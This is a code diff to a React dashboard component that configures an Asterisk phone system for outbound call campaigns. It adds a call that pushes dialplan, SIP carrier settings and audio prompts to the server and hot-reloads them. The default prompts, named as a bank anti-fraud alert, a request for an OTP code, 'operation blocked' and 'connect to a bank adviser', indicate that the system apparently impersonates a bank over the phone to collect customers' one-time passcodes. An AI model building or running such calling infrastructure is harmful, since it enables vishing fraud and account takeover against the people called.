@@ -472,13 +472,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setQuickUploadFile(null);
   };
 
-  // Synchronize campaign audios to Asterisk AstDB so it never plays a beep
+  // Synchronize campaign audios and complete dialplan to Asterisk so it never plays a beep
   const handleSyncAudiosToAsterisk = async (silent = false) => {
     setIsSyncingAudios(true);
     if (!silent) setAudioSyncFeedback(null);
     try {
       const currentAudios = campaignAudios[selectedService];
-      const res = await fetch('/api/asterisk/audio/sync-defaults', {
+      // 1. Sync Audios to AstDB
+      await fetch('/api/asterisk/audio/sync-defaults', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -490,13 +491,31 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           destination: targetNumber.trim() || '16104803845',
         }),
       });
+
+      // 2. Perform Full Dialplan, PJSIP & Hot Reload directly into /etc/asterisk/
+      const res = await fetch('/api/asterisk/sync/extensions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          extensions,
+          carriers,
+          audioIntro: currentAudios.introAudioPath || 'custom/alerta_banco_antifraude',
+          audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
+          audioWait: 'custom/un_momento_validando_informacion',
+          audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
+          audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
+        }),
+      });
+
       const data = await res.json();
       if (data.success && !silent) {
-        setAudioSyncFeedback('✓ Audios sincronizados con éxito en Asterisk AstDB.');
-        setTimeout(() => setAudioSyncFeedback(null), 4000);
+        setAudioSyncFeedback('✓ Asterisk sincronizado al 100%: Dialplan, Audios y PJSIP recargados.');
+        setTimeout(() => setAudioSyncFeedback(null), 5000);
+      } else if (!data.success && !silent) {
+        setAudioSyncFeedback('Aviso: ' + (data.error || 'No se pudo sincronizar'));
       }
     } catch (e: any) {
-      if (!silent) setAudioSyncFeedback('Error al sincronizar audios con Asterisk.');
+      if (!silent) setAudioSyncFeedback('Error al sincronizar con Asterisk.');
     } finally {
       setIsSyncingAudios(false);
     }
